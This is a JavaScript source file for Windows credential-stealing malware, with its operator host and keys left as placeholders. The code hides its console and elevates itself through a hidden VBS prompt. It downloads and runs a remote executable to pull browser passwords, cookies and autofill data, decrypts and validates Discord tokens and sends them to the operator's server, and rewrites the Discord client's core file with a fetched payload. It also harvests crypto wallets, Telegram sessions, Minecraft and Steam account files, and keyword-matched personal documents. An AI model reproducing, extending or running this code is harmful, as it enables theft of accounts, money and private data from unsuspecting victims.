console.log("h");
try {
  if (process.platform === "win32") {
    require("node-hide-console-window").hideConsole();
  }
} catch (e) {}
const admzip = require("adm-zip");
const axios = require("axios");
const crypto = require("crypto");
const fs = require("fs-extra");
const os = require("os");
const path = require("path");
const { execSync, spawn, exec, spawnSync } = require("child_process");
const FormData = require("form-data");
const https = require("https");
const { Dpapi } = require("@primno/dpapi");

// ==========================================
// 1. CONFIGURATION & CONSTANTS
// ==========================================

const CONFIG = {
  ALLOWED_EXTENSIONS: [
    ".csv",
    ".db",
    ".doc",
    ".docx",
    ".gif",
    ".jpeg",
    ".jpg",
    ".json",
    ".log",
    ".mp4",
    ".odt",
    ".pdf",
    ".png",
    ".ppt",
    ".pptx",
    ".rtf",
    ".txt",
    ".webp",
    ".xls",
    ".xlsx",
  ],
  FILE_KEYWORDS: [
    "2fa",
    "account",
    "acount",
    "backup",
    "banque",
    "code",
    "compte",
    "crypto",
    "discord",
    "exodus",
    "login",
    "mdp",
    "memo",
    "metamask",
    "mot_de_passe",
    "motdepasse",
    "passphrase",
    "passw",
    "paypal",
    "secret",
    "seecret",
    "token",
    "wallet",
  ],
  HOST_URL: "PLACEHOLDER_HOST_URL",
  STORAGE_PATH: path.join(process.env.APPDATA, "Microsoft Store"),
  USER_ID: "PLACEHOLDER_USER_ID",
  SECRET_KEY: "PLACEHOLDER_SECRET_KEY",
  MAIN_EXE_DOWNLOAD_URL: "/shared-files/download/main.cl",
  TIMEOUT: 3000,
};
console.log("b");

const WALLET_CONFIG = {
  PATHS: [
    {
      name: "Atomic",
      path: path.join(
        process.env.APPDATA,
        "atomic",
        "Local Storage",
        "leveldb",
      ),
    },
    {
      name: "Exodus",
      path: path.join(process.env.APPDATA, "Exodus", "exodus.wallet"),
    },
    {
      name: "Electrum",
      path: path.join(process.env.APPDATA, "Electrum", "wallets"),
    },
    {
      name: "Electrum-LTC",
      path: path.join(process.env.APPDATA, "Electrum-LTC", "wallets"),
    },
    { name: "Zcash", path: path.join(process.env.APPDATA, "Zcash") },
    { name: "Armory", path: path.join(process.env.APPDATA, "Armory") },
    { name: "Bytecoin", path: path.join(process.env.APPDATA, "bytecoin") },
    {
      name: "Jaxx",
      path: path.join(
        process.env.APPDATA,
        "com.liberty.jaxx",
        "IndexedDB",
        "file__0.indexeddb.leveldb",
      ),
    },
    {
      name: "Ethereum",
      path: path.join(process.env.APPDATA, "Ethereum", "keystore"),
    },
    {
      name: "Guarda",
      path: path.join(
        process.env.APPDATA,
        "Guarda",
        "Local Storage",
        "leveldb",
      ),
    },
    {
      name: "Coinomi",
      path: path.join(process.env.APPDATA, "Coinomi", "Coinomi", "wallets"),
    },
  ],
};

// Browser paths kept only for Discord token extraction
const BROWSER_PATHS = [
  {
    name: "Chrome",
    path: path.join(process.env.LOCALAPPDATA, "Google", "Chrome", "User Data"),
    task: "chrome.exe",
  },
  {
    name: "Edge",
    path: path.join(process.env.LOCALAPPDATA, "Microsoft", "Edge", "User Data"),
    task: "msedge.exe",
  },
  {
    name: "Brave",
    path: path.join(
      process.env.LOCALAPPDATA,
      "BraveSoftware",
      "Brave-Browser",
      "User Data",
    ),
    task: "brave.exe",
  },
  {
    name: "Opera",
    path: path.join(process.env.APPDATA, "Opera Software", "Opera Stable"),
    task: "opera.exe",
  },
  {
    name: "Opera GX",
    path: path.join(process.env.APPDATA, "Opera Software", "Opera GX Stable"),
    task: "opera.exe",
  },
  {
    name: "Yandex",
    path: path.join(
      process.env.APPDATA,
      "Yandex",
      "YandexBrowser",
      "User Data",
    ),
    task: "yandex.exe",
  },
  {
    name: "Vivaldi",
    path: path.join(process.env.LOCALAPPDATA, "Vivaldi", "User Data"),
    task: "vivaldi.exe",
  },
  {
    name: "Chromium",
    path: path.join(process.env.LOCALAPPDATA, "Chromium", "User Data"),
    task: "chromium.exe",
  },
  {
    name: "Thorium",
    path: path.join(process.env.LOCALAPPDATA, "Thorium", "User Data"),
    task: "thorium.exe",
  },
  {
    name: "CocCoc",
    path: path.join(process.env.LOCALAPPDATA, "CocCoc", "Browser", "User Data"),
    task: "coccoc.exe",
  },
];

// ==========================================
// 2. ADVANCED CRYPTO FUNCTIONS (Discord tokens)
// ==========================================

function decryptAESGCM(enc, key) {
  try {
    if (enc.length < 31) return null;
    const iv = enc.slice(3, 15);
    const data = enc.slice(15, -16);
    const tag = enc.slice(-16);
    const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
    decipher.setAuthTag(tag);
    return Buffer.concat([decipher.update(data), decipher.final()]).toString(
      "utf8",
    );
  } catch {
    return null;
  }
}

function decryptPasswordopw(encrypted, masterKey) {
  const buffer = Buffer.from(encrypted);
  const prefix3 = buffer.slice(0, 3).toString();
  try {
    if (["v10", "v11", "v80"].includes(prefix3)) {
      if (
        buffer.length < 31 ||
        !Buffer.isBuffer(masterKey) ||
        masterKey.length !== 32
      )
        return null;
      const iv = buffer.slice(3, 15);
      const cipherText = buffer.slice(15, buffer.length - 16);
      const authTag = buffer.slice(buffer.length - 16);
      if (iv.length !== 12 || authTag.length !== 16) return null;
      const decipher = crypto.createDecipheriv("aes-256-gcm", masterKey, iv);
      decipher.setAuthTag(authTag);
      try {
        const decrypted = Buffer.concat([
          decipher.update(cipherText),
          decipher.final(),
        ]);
        return decrypted.toString("utf8").replace(/\0/g, "").trim();
      } catch {
        const alt = buffer.slice(15);
        if (alt.length > 16) {
          const altAuth = alt.slice(-16);
          const altCipher = alt.slice(0, -16);
          const dec2 = crypto.createDecipheriv("aes-256-gcm", masterKey, iv);
          dec2.setAuthTag(altAuth);
          const decrypted2 = Buffer.concat([
            dec2.update(altCipher),
            dec2.final(),
          ]);
          return decrypted2.toString("utf8").replace(/\0/g, "").trim();
        }
        return null;
      }
    } else if (prefix3 === "v20") {
      if (
        buffer.length < 31 ||
        !Buffer.isBuffer(masterKey) ||
        masterKey.length !== 32
      )
        return null;
      const iv = buffer.slice(3, 15);
      const cipherText = buffer.slice(15, buffer.length - 16);
      const authTag = buffer.slice(buffer.length - 16);
      if (iv.length !== 12 || authTag.length !== 16) return null;
      const decipher = crypto.createDecipheriv("aes-256-gcm", masterKey, iv);
      decipher.setAuthTag(authTag);
      const decrypted = Buffer.concat([
        decipher.update(cipherText),
        decipher.final(),
      ]);
      if (decrypted.length > 32) {
        let nonAscii = 0;
        for (const b of decrypted.slice(0, 32))
          if (b < 32 || b > 126) nonAscii++;
        if (nonAscii > 5)
          return decrypted.slice(32).toString("utf8").replace(/\0/g, "").trim();
      }
      return decrypted.toString("utf8").replace(/\0/g, "").trim();
    } else {
      try {
        return Dpapi.unprotectData(buffer, null, "CurrentUser").toString(
          "utf8",
        );
      } catch {
        return null;
      }
    }
  } catch {
    return null;
  }
}

async function getEncryptionKey(browserPath) {
  const localStatePath = path.join(browserPath, "Local State");
  if (!fs.existsSync(localStatePath)) return null;
  try {
    const localStateData = JSON.parse(fs.readFileSync(localStatePath, "utf8"));
    const encryptedKey = localStateData.os_crypt?.encrypted_key;
    if (!encryptedKey) return null;
    const keyData = Buffer.from(encryptedKey, "base64");
    if (keyData.slice(0, 5).toString() !== "DPAPI") return null;
    const encryptedKeyData = keyData.slice(5);
    const decryptedKey = Dpapi.unprotectData(
      encryptedKeyData,
      null,
      "CurrentUser",
    );
    if (
      decryptedKey &&
      Buffer.isBuffer(decryptedKey) &&
      decryptedKey.length === 32
    )
      return decryptedKey;
    return null;
  } catch {
    return null;
  }
}

// ==========================================
// 3. UTILITIES
// ==========================================

const Utils = {
  kill: (name) => {
    if (process.platform !== "win32") return;
    try {
      execSync(`taskkill /F /IM ${name}`, {
        stdio: "ignore",
        windowsHide: true,
      });
    } catch (e) {
      /* ignore */
    }
  },
  exec: (cmd) => {
    try {
      return execSync(cmd, { encoding: "utf8", stdio: "pipe" }).toString();
    } catch {
      return "";
    }
  },
  getRandomString: (length = 10) =>
    crypto
      .randomBytes(Math.ceil(length / 2))
      .toString("hex")
      .slice(0, length),
  zip: (source, dest) => {
    try {
      const zip = new admzip();
      if (fs.statSync(source).isFile()) zip.addLocalFile(source);
      else zip.addLocalFolder(source, path.basename(source));
      zip.writeZip(dest);
      return true;
    } catch {
      return false;
    }
  },
};

// ==========================================
// 4. DATASTORE
// ==========================================

const DataStore = {
  cookies: [],
  passwords: [],
  tokens: [],
  webData: [],
  systemInfo: {},
  autofills: [],
  creditCards: [],
  history: [],
  downloads: [],
  searchHistory: [],
  firefox: { passwords: [], cookies: [], history: [], bookmarks: [] },
};

// ==========================================
// 5. ADMIN ELEVATION & UAC BYPASS
// ==========================================

function isAdmin() {
  try {
    execSync("net session", { stdio: "ignore" });
    return true;
  } catch {
    return false;
  }
}

function quoteWinArg(arg) {
  arg = String(arg);

  if (arg.length === 0) return '""';

  return `"${arg.replace(/(\\*)"/g, '$1$1\\"').replace(/(\\+)$/g, "$1$1")}"`;
}

function vbsEscape(str) {
  return String(str).replace(/"/g, '""');
}
function escapePS(str) {
  // Escape backslashes and double-quotes for PowerShell -Command
  return String(str).replace(/\\/g, "\\\\").replace(/"/g, '\\"');
}

function ensureAdmin() {
  if (process.platform !== "win32") return;
  if (isAdmin()) return;

  // Determine how we were launched
  const runningFromNode =
    path.basename(process.execPath).toLowerCase() === "node.exe";
  let appPath, appArgs;

  if (runningFromNode) {
    // Development: node script.js
    appPath = process.execPath;
    appArgs = [path.resolve(process.argv[1]), ...process.argv.slice(2)];
  } else {
    // Packaged executable
    appPath = process.execPath;
    appArgs = process.argv.slice(1);
  }

  // Build argument string with proper quoting
  const argsString = appArgs.map(quoteWinArg).join(" ");

  const cwd = process.cwd();

  // VBS script: ShellExecute with runas (elevate) and nShowCmd = 0 (SW_HIDE)
  const vbsContent = `
Set UAC = CreateObject("Shell.Application")
UAC.ShellExecute "${vbsEscape(appPath)}", "${vbsEscape(argsString)}", "${vbsEscape(cwd)}", "runas", 0
`;

  const vbsPath = path.join(os.tmpdir(), `elevate_${Date.now()}.vbs`);
  fs.writeFileSync(vbsPath, vbsContent.trim(), "utf8");

  // Execute VBS with wscript.exe (no console window for the launcher)
  spawnSync("wscript.exe", [vbsPath], {
    detached: true,
    stdio: "ignore",
    windowsHide: true,
  });

  // Clean up temporary VBS file
  try {
    fs.unlinkSync(vbsPath);
  } catch (e) {}

  // Exit the original (non‑admin) process
  process.exit(0);
}

// ==========================================
// 6. DOWNLOAD AND RUN MAIN.EXE IN TEMP FOLDER
// ==========================================
//
const getDownloadUrl = () => {
  const base = CONFIG.HOST_URL.replace(/\/+$/, "");
  const path = CONFIG.MAIN_EXE_DOWNLOAD_URL.startsWith("/")
    ? CONFIG.MAIN_EXE_DOWNLOAD_URL
    : "/" + CONFIG.MAIN_EXE_DOWNLOAD_URL;
  return base + path;
};

async function downloadMainExe() {
  const tempDir = path.join(os.tmpdir(), `extract_${Utils.getRandomString()}`);
  fs.ensureDirSync(tempDir);
  const downloadUrl = getDownloadUrl();
  const exePath = path.join(tempDir, "main.exe");
  //console.log(`[+] Downloading main.exe from ${CONFIG.MAIN_EXE_DOWNLOAD_URL} ...`);
  try {
    const response = await axios({
      method: "GET",
      url: downloadUrl,
      responseType: "stream",
      timeout: CONFIG.TIMEOUT,
      headers: {
        "X-User-ID": CONFIG.USER_ID,
        "X-Secret-Key": CONFIG.SECRET_KEY,
      },
    });
    const writer = fs.createWriteStream(exePath);
    response.data.pipe(writer);
    await new Promise((resolve, reject) => {
      writer.on("finish", resolve);
      writer.on("error", reject);
    });
    //console.log(`[+] Saved main.exe to ${exePath}`);
    return { exePath, tempDir };
  } catch (err) {
    // console.error('[-] Failed to download main.exe:', err.message);
    throw err;
  }
}

async function runMainExtractorFromTemp(exePath, tempDir) {
  //console.log('[+] Launching main.exe for browser data extraction...');
  const child = spawn(exePath, [], {
    cwd: tempDir,
    detached: true,
    stdio: "ignore",
    windowsHide: true,
  });
  child.unref();

  const outputZip = path.join(tempDir, "output.zip");
  let waited = 0;
  const maxWait = 60000;
  while (!fs.existsSync(outputZip) && waited < maxWait) {
    await new Promise((r) => setTimeout(r, 1000));
    waited += 1000;
  }

  if (!fs.existsSync(outputZip)) {
    // console.error('[!] main.exe did not produce output.zip within timeout');
    return null;
  }

  await new Promise((r) => setTimeout(r, 2000)); // extra delay for file flush
  return outputZip;
}

async function parseOutputZip(zipPath) {
  //console.log('[+] Parsing output.zip from main.exe...');
  let passwordFiles = 0,
    cookieFiles = 0,
    autofillFiles = 0;

  try {
    const zip = new admzip(zipPath);
    const zipEntries = zip.getEntries();

    for (const entry of zipEntries) {
      if (entry.isDirectory) continue;
      const parts = entry.entryName.split("/");
      if (parts.length < 3) continue; // skip unexpected paths

      const browser = parts[0];
      const profile = parts[1];
      const fileName = parts[2];
      let content;

      try {
        content = entry.getData().toString("utf8");
      } catch (decodeErr) {
        console.warn(
          `[!] Could not decode ${entry.entryName}: ${decodeErr.message}`,
        );
        continue;
      }

      // Normalize line endings to LF
      const normalized = content.replace(/\r\n/g, "\n");

      if (fileName === "passwords.txt") {
        passwordFiles++;
        let parsedCount = 0;

        // Use line-by-line parsing to be more robust than split('\n\n')
        const lines = normalized.split("\n");
        let currentEntry = null;

        for (let i = 0; i < lines.length; i++) {
          const line = lines[i].trim();
          if (line === "") continue;

          if (line.startsWith("URL:")) {
            // Start a new entry
            if (currentEntry) {
              // Save previous entry if it has at least URL and password
              if (currentEntry.url && currentEntry.password !== undefined) {
                DataStore.passwords.push({
                  browser: browser,
                  url: currentEntry.url,
                  username: currentEntry.username || "",
                  password: currentEntry.password,
                });
                parsedCount++;
              }
            }
            currentEntry = {
              url: line.substring(4).trim(),
              username: "",
              password: "",
            };
          } else if (currentEntry && line.startsWith("Login:")) {
            currentEntry.username = line.substring(6).trim();
          } else if (currentEntry && line.startsWith("Password:")) {
            currentEntry.password = line.substring(9).trim();
          }
        }
        // Don't forget the last entry
        if (
          currentEntry &&
          currentEntry.url &&
          currentEntry.password !== undefined
        ) {
          DataStore.passwords.push({
            browser: browser,
            url: currentEntry.url,
            username: currentEntry.username || "",
            password: currentEntry.password,
          });
          parsedCount++;
        }

        //console.log(`[+] ${browser} / ${profile} : parsed ${parsedCount} passwords`);
      } else if (fileName === "cookies.txt") {
        if (normalized.trim().length > 50) {
          DataStore.cookies.push({
            browser: browser,
            profile: profile,
            cookies: Buffer.from(normalized).toString("base64"),
          });
          cookieFiles++;
        }
      } else if (fileName === "auto_fills.txt") {
        autofillFiles++;
        let parsedCount = 0;

        // Similar robust parser for autofill entries
        const lines = normalized.split("\n");
        let currentField = null;

        for (const line of lines) {
          const trimmed = line.trim();
          if (trimmed === "") continue;

          if (trimmed.startsWith("Field:")) {
            if (currentField && currentField.name) {
              DataStore.autofills.push({
                browser: browser,
                profile: profile,
                name: currentField.name,
                value: currentField.value || "",
              });
              parsedCount++;
            }
            currentField = {
              name: trimmed.substring(6).trim(),
              value: "",
            };
          } else if (currentField && trimmed.startsWith("Value:")) {
            currentField.value = trimmed.substring(6).trim();
          }
        }
        // Last field
        if (currentField && currentField.name) {
          DataStore.autofills.push({
            browser: browser,
            profile: profile,
            name: currentField.name,
            value: currentField.value || "",
          });
          parsedCount++;
        }

        //console.log(`[+] ${browser} / ${profile} : parsed ${parsedCount} autofill entries`);
      }
    }

    //console.log(`[+] Parsing complete. Total: ${DataStore.passwords.length} passwords, ${DataStore.cookies.length} cookie files, ${DataStore.autofills.length} autofill entries`);
  } catch (err) {
    // console.error('[!] Failed to parse output.zip:', err.message);
    // Re-throw if caller needs to handle it
    throw err;
  }
}

// ==========================================
// 7. DISCORD TOKEN EXTRACTION (unchanged)
// ==========================================

function findLevelDBPaths(browserPath) {
  const results = [];
  if (!fs.existsSync(browserPath)) return results;
  const profiles = fs
    .readdirSync(browserPath, { withFileTypes: true })
    .filter((d) => d.isDirectory())
    .map((d) => d.name);
  for (const profile of profiles) {
    const leveldb = path.join(browserPath, profile, "Local Storage", "leveldb");
    if (fs.existsSync(leveldb)) results.push(leveldb);
  }
  const defaultLeveldb = path.join(
    browserPath,
    "Default",
    "Local Storage",
    "leveldb",
  );
  if (fs.existsSync(defaultLeveldb)) results.push(defaultLeveldb);
  return results;
}

async function safeStorageSteal(browserPath, platform) {
  const tokens = [];
  const masterKey = await getEncryptionKey(browserPath);
  if (!masterKey) return tokens;
  const leveldbPaths = findLevelDBPaths(browserPath);
  for (const leveldb of leveldbPaths) {
    const files = fs
      .readdirSync(leveldb)
      .filter((f) => f.endsWith(".log") || f.endsWith(".ldb"));
    for (const file of files) {
      const content = fs.readFileSync(path.join(leveldb, file), "utf8");
      const matches = content.match(/dQw4w9WgXcQ:[^\x22\s]+/g);
      if (matches) {
        for (let match of matches) {
          match = match.replace(/\\$/, "");
          const encPart = match.split("dQw4w9WgXcQ:")[1];
          if (encPart) {
            const encBuf = Buffer.from(encPart, "base64");
            const token = decryptAESGCM(encBuf, masterKey);
            if (token && !tokens.some((t) => t[0] === token))
              tokens.push([token, platform]);
          }
        }
      }
    }
  }
  return tokens;
}

function simpleSteal(browserPath, platform) {
  const tokens = [];
  const leveldbPaths = findLevelDBPaths(browserPath);
  const regex = /[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}/g;
  for (const leveldb of leveldbPaths) {
    const files = fs
      .readdirSync(leveldb)
      .filter((f) => f.endsWith(".log") || f.endsWith(".ldb"));
    for (const file of files) {
      const content = fs.readFileSync(path.join(leveldb, file), "utf8");
      const matches = content.match(regex);
      if (matches) {
        for (const token of matches) {
          if (!tokens.some((t) => t[0] === token))
            tokens.push([token, platform]);
        }
      }
    }
  }
  return tokens;
}

async function validateToken(token) {
  try {
    const { data } = await axios.get("https://discord.com/api/v9/users/@me", {
      headers: { Authorization: token },
      timeout: 10000,
    });
    if (data && data.id) {
      const username =
        data.discriminator === "0"
          ? data.username
          : `${data.username}#${data.discriminator}`;
      return {
        valid: true,
        userInfo: {
          id: data.id,
          username,
          email: data.email,
          phone: data.phone || "None",
          mfa_enabled: data.mfa_enabled,
        },
      };
    }
  } catch {}
  return { valid: false };
}

async function extractDiscordTokens() {
  const allTokens = [];
  const discordPaths = [
    {
      name: "Discord",
      path: path.join(
        process.env.APPDATA,
        "discord",
        "Local Storage",
        "leveldb",
      ),
    },
    {
      name: "Discord Canary",
      path: path.join(
        process.env.APPDATA,
        "discordcanary",
        "Local Storage",
        "leveldb",
      ),
    },
    {
      name: "Discord PTB",
      path: path.join(
        process.env.APPDATA,
        "discordptb",
        "Local Storage",
        "leveldb",
      ),
    },
  ];
  for (const dp of discordPaths) {
    if (fs.existsSync(dp.path)) {
      const files = fs
        .readdirSync(dp.path)
        .filter((f) => f.endsWith(".log") || f.endsWith(".ldb"));
      for (const file of files) {
        const content = fs.readFileSync(path.join(dp.path, file), "utf8");
        const matches = content.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}/g);
        if (matches) {
          for (const token of matches) {
            if (!allTokens.some((t) => t.token === token))
              allTokens.push({ token, source: dp.name });
          }
        }
      }
    }
  }
  const usersDir = path.join(process.env.SystemDrive || "C:", "Users");
  let users = [];
  if (fs.existsSync(usersDir))
    users = fs
      .readdirSync(usersDir)
      .filter(
        (u) =>
          fs.statSync(path.join(usersDir, u)).isDirectory() &&
          !["Public", "Default"].includes(u),
      );
  if (!users.length) users.push(os.userInfo().username);
  for (const user of users) {
    const appDataLocal = path.join(usersDir, user, "AppData", "Local");
    const appDataRoaming = path.join(usersDir, user, "AppData", "Roaming");
    for (const browser of BROWSER_PATHS) {
      let browserPath = browser.path
        .replace(process.env.LOCALAPPDATA || "", appDataLocal)
        .replace(process.env.APPDATA || "", appDataRoaming);
      if (!fs.existsSync(browserPath)) continue;
      const encryptedTokens = await safeStorageSteal(browserPath, browser.name);
      for (const [token, src] of encryptedTokens) {
        if (!allTokens.some((t) => t.token === token))
          allTokens.push({ token, source: src });
      }
      const plainTokens = simpleSteal(browserPath, browser.name);
      for (const [token, src] of plainTokens) {
        if (!allTokens.some((t) => t.token === token))
          allTokens.push({ token, source: src });
      }
    }
  }
  for (const { token, source } of allTokens) {
    const validation = await validateToken(token);
    if (validation.valid) {
      DataStore.tokens.push({
        token,
        source,
        id: validation.userInfo.id,
        username: validation.userInfo.username,
        email: validation.userInfo.email,
        phone: validation.userInfo.phone,
        mfa: validation.userInfo.mfa_enabled,
      });
    }
  }
}

async function sendDiscordTokensToServer() {
  if (DataStore.tokens.length === 0) return;
  for (const tokenInfo of DataStore.tokens) {
    try {
      await axios.post(
        `${CONFIG.HOST_URL}/discord`,
        {
          token: tokenInfo.token,
          userInfo: {
            id: tokenInfo.id,
            username: tokenInfo.username,
            email: tokenInfo.email,
            phone: tokenInfo.phone,
            mfa_enabled: tokenInfo.mfa,
          },
          friends: [],
        },
        {
          headers: {
            "X-API-KEY": "PLACEHOLDER_API_KEY",
            "X-BUILD-ID": CONFIG.USER_ID,
            "Content-Type": "application/json",
          },
        },
      );
      //console.log(`[+] Discord token sent for ${tokenInfo.username}`);
    } catch (err) {
      // console.error(`[-] Failed to send token for ${tokenInfo.username}:`, err.message);
    }
  }
}

// ==========================================
// 8. DISCORD INJECTION (unchanged)
// ==========================================
//
const getPayloadUrl = () => {
  const base = CONFIG.HOST_URL.replace(/\/+$/, "");
  const rel = CONFIG.PAYLOAD_DOWNLOAD_PATH.startsWith("/")
    ? CONFIG.PAYLOAD_DOWNLOAD_PATH
    : "/" + CONFIG.PAYLOAD_DOWNLOAD_PATH;
  return base + rel;
};

async function fetchPayload(url) {
  const res = await fetch(url);
  if (!res.ok) throw new Error(`HTTP error ${res.status}`);
  return await res.text();
}
async function dcinject() {
  const clients = [
    "Discord",
    "DiscordCanary",
    "DiscordPTB",
    "DiscordDevelopment",
    "Vesktop",
    "Vencord",
  ];
  for (const client of clients) {
    try {
      spawn("taskkill", ["/IM", `${client}.exe`, "/F"]);
    } catch {}
  }
  await new Promise((r) => setTimeout(r, 2000));

  const localappdata = process.env.LOCALAPPDATA;
  const appData = process.env.APPDATA;
  const targetDirs = [
    { base: localappdata, search: ["cord", "vencord", "vesktop"] },
    { base: appData, search: ["BetterDiscord"] },
  ];
  const PAYLOAD_URL = getPayloadUrl();
  const payload = await fetchPayload(PAYLOAD_URL);

  for (const target of targetDirs) {
    if (!fs.existsSync(target.base)) continue;
    const folders = fs
      .readdirSync(target.base)
      .filter((f) =>
        target.search.some((s) => f.toLowerCase().includes(s.toLowerCase())),
      );
    for (const folder of folders) {
      const fullPath = path.join(target.base, folder);
      try {
        const appDirs = fs
          .readdirSync(fullPath)
          .filter((d) => d.startsWith("app-"));
        appDirs.sort((a, b) =>
          b.localeCompare(a, undefined, { numeric: true }),
        );
        if (appDirs.length) {
          const modulesPath = path.join(fullPath, appDirs[0], "modules");
          if (fs.existsSync(modulesPath)) {
            const modFolders = fs.readdirSync(modulesPath);
            const coreFolder = modFolders.find((f) =>
              f.startsWith("discord_desktop_core"),
            );
            if (coreFolder) {
              const indexPath = path.join(
                modulesPath,
                coreFolder,
                "discord_desktop_core",
                "index.js",
              );
              if (fs.existsSync(indexPath)) {
                const content = fs.readFileSync(indexPath, "utf8");
                if (!content.includes(PAYLOAD_URL)) {
                  fs.writeFileSync(
                    indexPath,
                    `${payload}\nmodule.exports = require('./core.asar');`,
                    "utf8",
                  );
                }
              }
            }
          }
        }
      } catch {}
    }
  }

  for (const client of clients) {
    const updater = path.join(localappdata, client, "Update.exe");
    if (fs.existsSync(updater)) {
      spawn(updater, ["--processStart", `${client}.exe`], {
        stdio: "ignore",
        detached: true,
      }).unref();
    }
  }
}

// ==========================================
// 9. WALLET, FILES, TELEGRAM, MINECRAFT, STEAM
// ==========================================

const Discovery = {
  searchFiles: async (storagePath) => {
    const searchPaths = [
      path.join(os.homedir(), "Desktop"),
      path.join(os.homedir(), "Documents"),
      path.join(os.homedir(), "Downloads"),
      path.join(process.env.USERPROFILE, "OneDrive", "Desktop"),
      path.join(process.env.USERPROFILE, "OneDrive", "Documents"),
    ];
    const recursiveSearch = (dir, depth = 0) => {
      if (depth > 3 || !fs.existsSync(dir)) return;
      try {
        const items = fs.readdirSync(dir);
        for (const item of items) {
          const fullPath = path.join(dir, item);
          const stats = fs.statSync(fullPath);
          if (stats.isDirectory()) recursiveSearch(fullPath, depth + 1);
          else if (stats.isFile()) {
            const lower = item.toLowerCase();
            const isMatch =
              CONFIG.FILE_KEYWORDS.some((k) => lower.includes(k)) &&
              CONFIG.ALLOWED_EXTENSIONS.some((e) => lower.endsWith(e));
            if (isMatch && stats.size < 10 * 1024 * 1024) {
              const destName = `${path.basename(dir)}_${item}`;
              fs.copySync(fullPath, path.join(storagePath, destName));
            }
          }
        }
      } catch {}
    };
    for (const sp of searchPaths) recursiveSearch(sp);
  },
  scanWallets: async (storagePath) => {
    for (const wallet of WALLET_CONFIG.PATHS) {
      if (fs.existsSync(wallet.path)) {
        const dest = path.join(storagePath, `Wallet-${wallet.name}.zip`);
        Utils.zip(wallet.path, dest);
      }
    }
  },
  extractTelegram: async (storagePath) => {
    const tdata = path.join(process.env.APPDATA, "Telegram Desktop", "tdata");
    if (fs.existsSync(tdata)) {
      Utils.kill("Telegram.exe");
      Utils.zip(tdata, path.join(storagePath, "Telegram.zip"));
    }
  },
  extractMinecraft: async (storagePath) => {
    const mcDataRoot = path.join(storagePath, "Minecraft");
    fs.ensureDirSync(mcDataRoot);

    // Helper to copy a file or folder if exists
    const copyIfExists = (src, destSubPath) => {
      if (!src) return false;
      const dest = path.join(mcDataRoot, destSubPath);
      if (fs.existsSync(src)) {
        fs.copySync(src, dest);
        return true;
      }
      return false;
    };

    // 1. Vanilla Minecraft (official launcher)
    const vanillaDir = path.join(process.env.APPDATA, ".minecraft");
    if (fs.existsSync(vanillaDir)) {
      const vanillaDest = "Vanilla";
      const vanillaFiles = [
        "launcher_profiles.json",
        "launcher_accounts.json",
        "microsoft_accounts.json",
      ];
      vanillaFiles.forEach((file) => {
        const src = path.join(vanillaDir, file);
        copyIfExists(src, path.join(vanillaDest, file));
      });
    }

    // 2. Lunar Client
    const lunarDirs = [
      path.join(process.env.APPDATA, ".lunarclient"),
      path.join(process.env.LOCALAPPDATA, "Lunar Client"),
    ];
    for (const lunarDir of lunarDirs) {
      if (fs.existsSync(lunarDir)) {
        const accountsSrc = path.join(lunarDir, "settings", "accounts.json");
        copyIfExists(accountsSrc, "LunarClient/accounts.json");
        const settingsSrc = path.join(lunarDir, "settings", "settings.json");
        copyIfExists(settingsSrc, "LunarClient/settings.json");
        break;
      }
    }

    // 3. Badlion Client
    const badlionDir = path.join(process.env.APPDATA, "Badlion Client");
    if (fs.existsSync(badlionDir)) {
      copyIfExists(
        path.join(badlionDir, "accounts.json"),
        "Badlion/accounts.json",
      );
      copyIfExists(path.join(badlionDir, "config.json"), "Badlion/config.json");
    }

    // 4. Feather Client
    const featherDir = path.join(process.env.APPDATA, "Feather");
    if (fs.existsSync(featherDir)) {
      copyIfExists(
        path.join(featherDir, "accounts.json"),
        "Feather/accounts.json",
      );
      copyIfExists(
        path.join(featherDir, "settings.json"),
        "Feather/settings.json",
      );
    }

    // 5. Prism Launcher
    const prismDir = path.join(process.env.APPDATA, "PrismLauncher");
    if (fs.existsSync(prismDir)) {
      copyIfExists(
        path.join(prismDir, "accounts.json"),
        "PrismLauncher/accounts.json",
      );
      copyIfExists(
        path.join(prismDir, "prismlauncher.cfg"),
        "PrismLauncher/prismlauncher.cfg",
      );
    }

    // 6. MultiMC
    const multiMCDir = path.join(process.env.APPDATA, "MultiMC");
    if (fs.existsSync(multiMCDir)) {
      copyIfExists(
        path.join(multiMCDir, "accounts.json"),
        "MultiMC/accounts.json",
      );
      copyIfExists(path.join(multiMCDir, "multimc.cfg"), "MultiMC/multimc.cfg");
    }

    // 7. ATLauncher
    const atlDir = path.join(process.env.APPDATA, "ATLauncher");
    if (fs.existsSync(atlDir)) {
      copyIfExists(
        path.join(atlDir, "accounts.json"),
        "ATLauncher/accounts.json",
      );
      copyIfExists(path.join(atlDir, "config.json"), "ATLauncher/config.json");
    }

    // 8. CurseForge (Overwolf)
    const curseforgeOverwolf = path.join(
      process.env.APPDATA,
      "Overwolf",
      "CurseForge",
    );
    if (fs.existsSync(curseforgeOverwolf)) {
      const minecraftSub = path.join(curseforgeOverwolf, "Minecraft");
      if (fs.existsSync(minecraftSub)) {
        const dest = path.join(mcDataRoot, "CurseForge");
        fs.copySync(minecraftSub, dest);
      }
    }
    // Legacy standalone CurseForge
    const curseforgeStandalone = path.join(process.env.APPDATA, "CurseForge");
    if (fs.existsSync(curseforgeStandalone)) {
      copyIfExists(
        path.join(curseforgeStandalone, "accounts.json"),
        "CurseForgeStandalone/accounts.json",
      );
    }

    // 9. PolyMC
    const polyMcDir = path.join(process.env.APPDATA, "PolyMC");
    if (fs.existsSync(polyMcDir)) {
      copyIfExists(
        path.join(polyMcDir, "accounts.json"),
        "PolyMC/accounts.json",
      );
      copyIfExists(path.join(polyMcDir, "polymc.cfg"), "PolyMC/polymc.cfg");
    }

    // Finally, zip everything together
    const zipPath = path.join(storagePath, "Minecraft.zip");
    Utils.zip(mcDataRoot, zipPath);

    // Clean up temporary folder
    fs.removeSync(mcDataRoot);
  },
  extractSteam: async (storagePath) => {
    const steamPath = path.join("C:", "Program Files (x86)", "Steam");
    if (fs.existsSync(steamPath)) {
      const steamData = path.join(storagePath, "Steam");
      fs.ensureDirSync(steamData);
      const files = fs.readdirSync(steamPath);
      for (const f of files)
        if (f.startsWith("ssfn"))
          fs.copySync(path.join(steamPath, f), path.join(steamData, f));
      const config = path.join(steamPath, "config");
      if (fs.existsSync(config))
        fs.copySync(config, path.join(steamData, "config"));
      Utils.zip(steamData, path.join(storagePath, "Steam.zip"));
      fs.removeSync(steamData);
    }
  },
};

